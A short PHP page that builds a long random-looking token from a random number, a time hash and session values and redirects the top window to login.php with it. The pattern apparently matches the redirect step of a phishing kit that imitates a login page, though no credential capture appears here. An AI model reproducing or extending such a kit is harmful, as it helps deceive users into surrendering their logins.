<?php
	include('../edit/lang.php');
	$An = rand(999999999999999999, 99999999999999999999999999999);
	$Oni = md5(gmdate('r'));
	$Sma = $_SESSION['AYCOUNT'];
	$VFinal = $_SESSION['AYCOUNTCODE'];
	$x = "_";
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script language="javascript">
var page = "./login.php?<?php echo $VFinal.$x.$An.$x.$Oni.$x.$Sma ; ?>"        
top.location = page;
</script> 
</head>
</html>
